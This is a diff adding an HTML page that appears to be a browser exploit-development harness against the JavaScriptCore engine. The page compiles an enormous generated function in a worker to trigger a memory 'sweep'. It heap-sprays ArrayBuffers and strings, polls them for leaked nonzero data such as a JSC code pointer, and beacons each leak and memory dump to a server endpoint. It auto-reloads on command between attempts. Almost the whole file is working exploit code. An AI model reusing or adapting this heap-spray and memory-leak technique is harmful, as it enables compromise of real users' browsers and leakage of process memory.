@@ -1,0 +1,195 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1164 - Pre-Spray Sweep Harvest</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<h2>P1164 Pre-Spray Sweep Harvest (p146 pre-alloc architecture)</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1164-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1164: pre-spray BEFORE the call (community p146 architecture).
+   - 1500 x 100KB ABs (150MB, zero-init; sweep writes nonzero through them)
+   - 200 strings in sizes 16..8192 (small zones may sit above the buffer)
+   Worker compiles (N=38,348,816 -> 100KB buffer), then main sprays, then
+   GO: worker calls -> 4.29GB sweep. Main polls at 15ms: first 1KB of each
+   AB (sweep enters an AB from its start) + string .length anomalies.
+   First nonzero qword = sweep reached our buffer; the 112B grid then
+   carries the 0xFFFFFFFF signature and the JSC CODE POINTER at +24.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var attempt=0;
+try{attempt=parseInt(localStorage.getItem('p1164_att')||'0');}catch(e){}
+try{localStorage.setItem('p1164_att',''+(attempt+1));}catch(e){}
+B('BOOT','attempt='+attempt);
+
+if(attempt>=2){
+  B('IDLE','2 attempts done');
+  log('=== IDLE ===','ok');
+  try{localStorage.removeItem('p1164_att');}catch(e){}
+}else{
+
+var N_TARGET=38348816;
+var CHUNK=4000000;
+var CHUNKS=Math.floor(N_TARGET/CHUNK);
+var REM=N_TARGET-CHUNKS*CHUNK;
+
+function buildBlob(){
+  var t0=Date.now();
+  var parts=[];
+  parts.push('self.__v141fn=function(a){');
+  for(var c=0;c<CHUNKS;c++){
+    parts.push('a();'.repeat(CHUNK));
+    if(c%4===0)B('BLD','c='+c+'|ms='+(Date.now()-t0));
+  }
+  if(REM>0)parts.push('a();'.repeat(REM));
+  parts.push('};self.postMessage({t:"compiled"});');
+  var blob=new Blob(parts,{type:'application/javascript'});
+  parts=null;
+  B('BLOB','ms='+(Date.now()-t0));
+  return URL.createObjectURL(blob);
+}
+
+var abs=[];     /* 100KB ABs */
+var strs=[];    /* witness strings */
+var scanIdx=0;
+var lastB=0;
+var finds=0;
+
+/* spray after compile, before call */
+function spray(){
+  var t0=Date.now();
+  for(var i=0;i<1500;i++){
+    abs.push(new ArrayBuffer(100*1024));
+  }
+  B('AB-SPRAY','n='+abs.length+'|ms='+(Date.now()-t0));
+  var sizes=[16,32,64,96,160,192,256,512,1024,2048,4096,8192];
+  for(var s=0;s<sizes.length;s++){
+    for(var k=0;k<16;k++){
+      var str='Q'.repeat(sizes[s])+sizes[s]+'.'+k;
+      strs.push({s:str,len:str.length});
+    }
+  }
+  B('STR-SPRAY','n='+strs.length);
+}
+
+/* 15ms poll: first 1KB of each AB (128 qwords) */
+function poll(){
+  if(!goSent)return;
+  var end=Math.min(scanIdx+40,abs.length);
+  var hit=0;
+  for(var i=scanIdx;i<end&&!hit;i++){
+    var ab=abs[i];
+    if(!ab)continue;
+    var dv=new DataView(ab);
+    for(var q=0;q<128;q++){
+      var lo=dv.getUint32(q*8,true),hi=dv.getUint32(q*8+4,true);
+      if(lo!==0||hi!==0){
+        B('AB-NZ','i='+i+'|q='+q+'|v='+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0'));
+        log('*** AB['+i+'] q'+q+' = 0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0')+' ***','hit');
+        /* deep dump the first 112B of the entry region */
+        var dump=[];
+        for(var d=0;d<14&&q*8+d*8<ab.byteLength;d++){
+          var dl=dv.getUint32(q*8+d*8,true),dh=dv.getUint32(q*8+d*8+4,true);
+          dump.push(dh.toString(16).padStart(8,'0')+dl.toString(16).padStart(8,'0'));
+        }
+        B('AB-DUMP','i='+i+'|'+dump.join(','));
+        finds++;hit=1;break;
+      }
+    }
+    scanIdx=i+1;
+  }
+  /* strings */
+  for(var si=0;si<strs.length&&!hit;si++){
+    var w=strs[si];
+    var len;
+    try{len=w.s.length;}catch(e){B('STR-ERR','i='+si);hit=1;break;}
+    if(len!==w.len){
+      B('STR-HIT','i='+si+'|base='+w.len+'|now='+len);
+      log('*** STRING['+si+'] length '+w.len+' -> '+len+' ***','hit');
+      finds++;hit=1;
+    }
+  }
+  if(!hit&&Date.now()-lastB>700){
+    lastB=Date.now();
+    B('POLL','abs='+abs.length+'|scanned='+scanIdx+'|finds='+finds);
+  }
+  if(finds>=3){return;}
+  setTimeout(poll,15);
+}
+
+/* worker */
+var blobUrl=buildBlob();
+var wcode='importScripts('+JSON.stringify(blobUrl)+');'+
+  'self.onmessage=function(m){if(m.data==="go"){'+
+  'try{self.__v141fn(function(){ });}'+
+  'catch(e){self.postMessage({t:"err",e:String(e)});}}};';
+var wUrl=URL.createObjectURL(new Blob([wcode],{type:'application/javascript'}));
+var worker=new Worker(wUrl);
+worker.__compiled=false;
+var goSent=false;
+worker.onmessage=function(m){
+  if(m.data&&m.data.t==='compiled'){
+    worker.__compiled=true;
+    B('WORKER-COMPILED','ok');
+    /* spray AFTER compile (memory peak control), then GO */
+    setTimeout(function(){
+      spray();
+      setTimeout(function(){
+        goSent=true;
+        B('GO','sweep start');
+        log('=== GO ===','warn');
+        poll();
+        worker.postMessage('go');
+        setTimeout(function(){
+          B('SURVIVED','finds='+finds);
+          B('DONE','survived');
+        },20000);
+      },300);
+    },300);
+  }
+  else if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));}
+};
+B('WORKER','created');
+
+setTimeout(function(){
+  if(!goSent){B('TIMEOUT','no go');B('DONE','timeout');}
+},90000);
+
+} /* attempts */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1164-prespray-harvest';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
